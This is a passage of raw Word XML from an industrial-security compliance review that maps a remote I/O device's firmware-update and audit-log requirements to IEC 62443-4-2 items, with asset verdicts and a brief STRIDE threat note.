            <w:r w:rsidRPr="0002207B"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1312A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t>Circular</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> ≥100 </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>buffer</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (SRIO-10703/10663).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="18799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1FB1A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 xml:space="preserve">CR 3.9 – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Protection</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>of</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>audit</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>information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AEEF5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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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E1708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Killer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64248" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Log non-safety (QM), cleared on cold start (SRIO-6521); the </w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">install </w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>reboot</w:t>
            </w:r>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-2953) + Exit-Update power reset (SRIO-9916) destroy the record.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="29820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E3383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lastRenderedPageBreak/>
              <w:t xml:space="preserve">CR 6.1 – Audit-log </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>accessibility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AD4F2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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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83622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1979C" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>Log IoT-</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>readable</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (SRIO-10662).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="43C3A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CE385" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>EDR 2.13 – Physical diagnostic/test interfaces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158A2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➕</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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2074F" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B"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F2DFB" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Correct home for the debug/test-port point (fusing = exclusion, not evidence).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="002046B2" w14:paraId="01961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C5004" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:del w:id="25" w:author="Unknown">
              <w:r w:rsidRPr="002046B2">
                <w:rPr>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:delText>CR 3.4 via REVISION_COUNTER / I&amp;M4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68099" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B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02A93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Removed</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> → RQ-009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E1DB2" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="002046B2" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="002046B2">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>Config-modification markers belong to RQ-009.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="76DA62A4" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
      </w:pPr>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Corrected mapping:</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> RQ-008 → EHSR 1.1.9 §2 (software) →</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>{CR 2.8, CR 2.9, CR 2.10, CR 2.11, CR 2.12, CR 3.9, CR 6.1, EDR 2.13}</w:t>
      </w:r>
      <w:r w:rsidRPr="002046B2">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:hyperlink r:id="rId179" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve">[IEC62443_4_2_source | </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>Txt</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>]</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="0002207B">
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:hyperlink r:id="rId180" w:history="1">
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>[209_SRIO_C...</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t>e_RemoteIO</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="0002207B">
          <w:rPr>
            <w:rStyle w:val="Hyperlink"/>
          </w:rPr>
          <w:t xml:space="preserve"> | PDF]</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="33072CCF" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="0002207B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927"/>
        <w:gridCol w:w="6301"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="2F5976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4ED08D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A37269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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Your</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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690109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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Verdict</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="216DA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06035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>Asset D – subject of intervention (firmware)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77E5C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77699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t>Correct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primary</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="26DAF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229E4" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">Asset G – software-intervention </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>trigger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DCFE4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D4348" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Correct — FW update gated by rotary </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>999 + reboot</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (SRIO-2013/11534). </w:t>
            </w:r>
            <w:hyperlink r:id="rId181" w:history="1">
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[100_SRIO_P...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">, </w:t>
            </w:r>
            <w:hyperlink r:id="rId182" w:history="1">
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t xml:space="preserve"> | PDF]</w:t>
              </w:r>
            </w:hyperlink>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="749E94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59E30" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">Asset I – </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B"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2795E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6F480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>Correct — candidate store = COM Error Log (non-safety, volatile).</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="6A4DE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FBFE4" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve">Asset F – Domain </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>separation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13684" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
              </w:rPr>
              <w:t>✅</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:t xml:space="preserve"> (I </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>added</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207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531A3" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">Keep — log on non-safety COM; update commands cross </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> (UPDATE_START/COMPLETED/FAILED, SRIO-10785). </w:t>
            </w:r>
            <w:hyperlink r:id="rId183" w:history="1">
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>[</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>Market_Acc</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>...</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r w:rsidRPr="0002207B">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                </w:rPr>
                <w:t>ty_Systems</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="0002207B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4AF7CD39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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>STRIDE:</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>✅</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Repudiation (primary)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> + </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:rFonts w:ascii="Segoe UI Emoji" w:hAnsi="Segoe UI Emoji" w:cs="Segoe UI Emoji"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>➕</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Tampering-on-audit</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> (cold-start/reboot clears the log; MITRE ATT&amp;CK for ICS </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>T0872</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:i/>
          <w:iCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Indicator Removal on Host</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — justifies CR 3.9). No change needed.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F88D8AE" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w:rsidRDefault="0002207B" w:rsidP="0002207B">
      <w:pPr>
        <w:pStyle w:val="KeinLeerraum"/>
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>1.3 Security Functions &amp; Gaps — Cross-Referenced</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FED3DF0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b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Software-intervention evidence surface</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve"> — corrected to </w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>exclude config markers</w:t>
      </w:r>
      <w:r w:rsidRPr="00DC3DB6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154"/>
        <w:gridCol w:w="1752"/>
        <w:gridCol w:w="2308"/>
      </w:tblGrid>
      <w:tr w:rsidR="0002207B" w:rsidRPr="0002207B" w14:paraId="5DA9A0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6DF8E7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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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F29228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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Documentation</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B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DD302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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Evidences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F4E2B2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proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>Failure</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0002207B" w:rsidRPr="00DC3DB6" w14:paraId="67F196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DA5E3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COM Error Log (FW-update actions, self-detected errors, </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> timeout)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1E09E" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:t>SRIO-10665/10703/10663/6521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2B723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i/>
                <w:iCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t>That</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve"> a software event occurred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873DC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Circular, non-safety, cold-start-cleared </w:t>
            </w:r>
            <w:hyperlink r:id="rId184" w:history="1">
              <w:r w:rsidRPr="00DC3DB6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DC3DB6">
                <w:rPr>
                  <w:rStyle w:val="Hyperlink"/>
                  <w:lang w:val="en-US"/>
                </w:rPr>
                <w:t>e_RemoteIO</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r w:rsidRPr="00DC3DB6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02207B" w:rsidRPr="00DC3DB6" w14:paraId="12294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9459E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SysCom</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> update </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>command</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>respo</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>nse</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:rPr>
                <w:b/>
                <w:bCs/>
              </w:rPr>
              <w:t>events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30879B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lastRenderedPageBreak/>
              <w:t>SRIO-10785 (UPDATE_START/COMPLETED</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>/FAILED)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F0A8B" w14:textId="77777777" w:rsidR="0002207B" w:rsidRPr="0002207B" w:rsidRDefault="0002207B" w:rsidP="0002207B">
            <w:pPr>
              <w:pStyle w:val="KeinLeerraum"/>
            </w:pPr>
            <w:r w:rsidRPr="0002207B">
              <w:lastRenderedPageBreak/>
              <w:t xml:space="preserve">Update </w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>start</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>success</w:t>
            </w:r>
            <w:proofErr w:type="spellEnd"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>/</w:t>
            </w:r>
            <w:proofErr w:type="spellStart"/>
            <w:r w:rsidRPr="0002207B">
              <w:t>f</w:t>
            </w:r>
            <w:r w:rsidRPr="0002207B">
              <w:lastRenderedPageBreak/>
              <w:t>ailure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44A0A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lastRenderedPageBreak/>
              <w:t xml:space="preserve">Transient control messages, </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:t xml:space="preserve">not </w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
                <w:b/>
                <w:bCs/>
                <w:lang w:val="en-US"/>
              </w:rPr>
              <w:lastRenderedPageBreak/>
              <w:t>persistently logged</w:t>
            </w:r>
            <w:r w:rsidRPr="00DC3DB6">
              <w:rPr>
